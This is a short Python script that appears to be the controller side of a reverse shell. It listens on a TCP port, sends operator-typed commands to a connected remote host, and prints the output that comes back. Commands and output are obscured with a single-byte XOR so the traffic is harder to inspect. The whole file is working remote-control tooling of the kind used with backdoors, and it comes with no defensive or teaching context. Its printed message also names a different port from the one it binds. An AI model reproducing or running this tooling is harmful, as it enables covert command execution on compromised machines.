#!/usr/bin/env python3
# -*- coding:utf-8 -*-
# Author:Ameng, jlx-love.com
from socket import *
import struct
client = socket(AF_INET,SOCK_STREAM)
client.bind(('0.0.0.0',7777))
client.listen(5)
print('[+]Listening on port 8080...')
(conn,(ip,port)) = client.accept()
print('connect successfully to',ip)

def encrypt(data):
    data = bytearray(data)
    for i in range(len(data)):
        data[i] ^= 0x23
    return data

def decrypt(data):
    data = bytearray(data)
    for i in range(len(data)):
        data[i] ^= 0x23
    return data

while True:
    cmd = input('~$ ').strip()
    if len(cmd) == 0:
        continue
    cmd = encrypt(cmd.encode('utf-8'))
    conn.send(cmd)
    header = conn.recv(4)
    total_size = struct.unpack('i',header)[0]
    recv_size = 0
    while recv_size < total_size:
        recv_data = conn.recv(1024)
        recv_size += len(recv_data)
        recv_data = decrypt(recv_data)
        print(recv_data.decode('utf-8'), end='')
